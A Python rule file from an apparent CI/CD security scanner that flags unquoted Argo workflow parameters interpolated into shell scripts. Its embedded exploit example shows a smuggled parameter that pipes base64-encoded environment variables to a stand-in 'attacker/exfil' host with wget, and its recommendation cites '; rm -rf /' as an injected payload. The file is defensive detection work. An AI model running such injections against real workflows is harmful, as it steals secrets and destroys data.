"""ARGO-005, ``{{inputs.parameters.X}}`` interpolated unsafely."""
from __future__ import annotations

import re

from ...base import Finding, Severity
from ...rule import Rule
from ..base import ArgoContext, iter_containers, iter_templates, template_name

RULE = Rule(
    id="ARGO-005",
    title="Argo input parameter interpolated unsafely in script / args",
    severity=Severity.CRITICAL,
    owasp=("CICD-SEC-4", "CICD-SEC-1"),
    esf=("ESF-D-CODE-INTEGRITY",),
    cwe=("CWE-78",),
    recommendation=(
        "Don't interpolate ``{{inputs.parameters.<name>}}`` directly "
        "into ``script.source`` or ``container.args``. Argo "
        "substitutes the value before the shell parses it, so a "
        "parameter containing ``; rm -rf /`` runs as shell. Pass "
        "the parameter via ``env:`` "
        "(``value: '{{inputs.parameters.<name>}}'``) and reference "
        "the env var quoted in the script (``\"$NAME\"``); or use "
        "``inputs.artifacts`` for file payloads."
    ),
    docs_note=(
        "Fires on any ``{{inputs.parameters.X}}``, "
        "``{{workflow.parameters.X}}``, or ``{{item.X}}`` token "
        "inside a ``script.source`` body or a ``container.args`` "
        "string that isn't already wrapped in quotes. Doesn't fire "
        "on the env-var indirection pattern, which is safe."
    ),
    known_fp=(
        "Parameters whose values are always controlled by trusted "
        "templates (a fixed enum, an internal SHA, an upstream "
        "service identifier the workflow generates itself) are "
        "safe to interpolate unquoted but the rule has no way to "
        "see the producer. Suppress per-template with "
        "``--ignore-file`` once you've verified the parameter "
        "source can't reach a user. Quoted forms "
        "(``\"{{inputs.parameters.X}}\"``) are already excluded "
        "by the negative-lookbehind, so the typical safe pattern "
        "doesn't false-positive.",
    ),
    exploit_example=(
        "# Vulnerable: webhook-triggered workflow interpolates a\n"
        "# user-supplied parameter directly into a shell script.\n"
        "apiVersion: argoproj.io/v1alpha1\n"
        "kind: Workflow\n"
        "metadata: { generateName: greet- }\n"
        "spec:\n"
        "  entrypoint: main\n"
        "  arguments:\n"
        "    parameters:\n"
        "      - name: who\n"
        "  templates:\n"
        "    - name: main\n"
        "      inputs: { parameters: [ { name: who } ] }\n"
        "      script:\n"
        "        image: alpine:3.20\n"
        "        command: [sh]\n"
        "        source: |\n"
        "          echo Hello {{inputs.parameters.who}}\n"
        "\n"
        "# Attack: a webhook caller (or anyone with Submit on the\n"
        "# WorkflowTemplate) supplies a parameter carrying shell:\n"
        "#\n"
        "#   argo submit greet.yml -p who='x;wget -qO- attacker/exfil \\\n"
        "#     -d \"$(env|base64)\";:'\n"
        "#\n"
        "# Argo substitutes the parameter BEFORE handing the source\n"
        "# to ``sh``, so the `;` ends the echo and the next command\n"
        "# runs. The pod inherits the workflow's ServiceAccount; if\n"
        "# that SA has any cluster privilege (mount, image-pull, kubectl)\n"
        "# the attacker now has it.\n"
        "\n"
        "# Safe: route through env so the shell only sees a quoted\n"
        "# expansion of a controlled-name variable.\n"
        "      script:\n"
        "        image: alpine:3.20\n"
        "        command: [sh]\n"
        "        env:\n"
        "          - name: WHO\n"
        "            value: '{{inputs.parameters.who}}'\n"
        "        source: |\n"
        "          echo \"Hello $WHO\""
    ),
)

_UNSAFE_PARAM_RE = re.compile(
    r"(?<!['\"])\{\{(?:inputs|workflow|item)\.parameters?\.[A-Za-z0-9_-]+\}\}"
    r"|(?<!['\"])\{\{item\.[A-Za-z0-9_-]+\}\}"
    r"|(?<!['\"])\{\{item\}\}"
)


def _scan_text(text: str) -> list[str]:
    hits = []
    for m in _UNSAFE_PARAM_RE.finditer(text):
        hits.append(m.group(0))
    return hits


def check(ctx: ArgoContext) -> Finding:
    offenders: list[str] = []
    # Per-template anchor in the form ``<Kind>/<name>:<template>`` so
    # AC-025 can intersect with ARGO-002's per-template anchors. The
    # same template both running privileged AND interpolating an
    # unsafe param is the precise node-escape primitive.
    anchor_templates: dict[str, None] = {}
    for doc in ctx.docs:
        for idx, tmpl in enumerate(iter_templates(doc)):
            tname = template_name(tmpl, idx)
            for container in iter_containers(tmpl):
                src = container.get("source")
                if isinstance(src, str):
                    hits = _scan_text(src)
                    if hits:
                        offenders.append(
                            f"{doc.kind}/{doc.name} "
                            f"{tname} script: {hits[0]}"
                        )
                        anchor_templates[f"{doc.kind}/{doc.name}:{tname}"] = None
                        continue
                args = container.get("args")
                if isinstance(args, list):
                    found = False
                    for a in args:
                        if isinstance(a, str):
                            hits = _scan_text(a)
                            if hits:
                                offenders.append(
                                    f"{doc.kind}/{doc.name} "
                                    f"{tname} args: {hits[0]}"
                                )
                                anchor_templates[f"{doc.kind}/{doc.name}:{tname}"] = None
                                found = True
                                break
                    if found:
                        continue
                cmd = container.get("command")
                if isinstance(cmd, list):
                    for c in cmd:
                        if isinstance(c, str):
                            hits = _scan_text(c)
                            if hits:
                                offenders.append(
                                    f"{doc.kind}/{doc.name} "
                                    f"{tname} command: {hits[0]}"
                                )
                                anchor_templates[f"{doc.kind}/{doc.name}:{tname}"] = None
                                break
    if not ctx.docs:
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource="argo",
            description="No Argo documents to check.",
            recommendation="No action required.", passed=True,
        )
    passed = not offenders
    desc = (
        "No unsafe parameter interpolation in scripts / args."
        if passed else
        f"{len(offenders)} template(s) interpolate parameters "
        f"unquoted: {'; '.join(offenders[:5])}"
        f"{'…' if len(offenders) > 5 else ''}."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource="argo", description=desc,
        recommendation=RULE.recommendation, passed=passed,
        job_anchors=tuple(anchor_templates),
    )
